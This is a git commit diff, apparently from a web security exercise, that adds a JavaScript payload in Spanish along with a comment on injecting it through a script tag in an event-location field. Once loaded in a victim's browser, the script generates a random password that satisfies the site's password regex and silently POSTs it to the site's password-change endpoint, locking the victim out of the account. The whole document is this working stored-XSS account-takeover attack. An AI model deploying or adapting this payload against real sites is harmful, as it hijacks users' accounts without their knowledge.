003038c8859ddf048e06e3fde47130471871ec42
Diego <34724728+Calcoph@users.noreply.github.com>
2022-12-04 19:07:37 +0100

    se cambia la contraseña

--- app/a.js
+++ app/a.js
@@ -1,3 +1,26 @@
 // Donde pone "introduce lugar del evento" hay que poner <script src="http://localhost:82/a.js"></script>
 
-alert("Magia!")
+alert("Contraseña cambiada!")
+
+// Solo dios sabe lo que hace esa regex, asi que en vez de
+// averiguar lo que hace, vamos a generar una que creemos
+// que funcionará y comprobarlo por si acaso
+expr_contraseña = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[$@$!%*?&.])[A-Za-z\d$@$!%*?&.]{8,}$/
+final_contraseña = "aA99!!"
+var contraseña = ""
+while (!contraseña.match(expr_contraseña)) {
+    contraseña = ""
+    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+    var charactersLength = characters.length
+    for ( var i = 0; i < 20; i++ ) {
+        contraseña += characters.charAt(Math.floor(Math.random() * charactersLength))
+    }
+    
+    contraseña = contraseña + final_contraseña
+}
+
+let httpreq = new XMLHttpRequest()
+httpreq.open("POST", "cambioContrasena.php")
+httpreq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+let data = `contrase%C3%B1a=${contraseña}`
+httpreq.send(data)
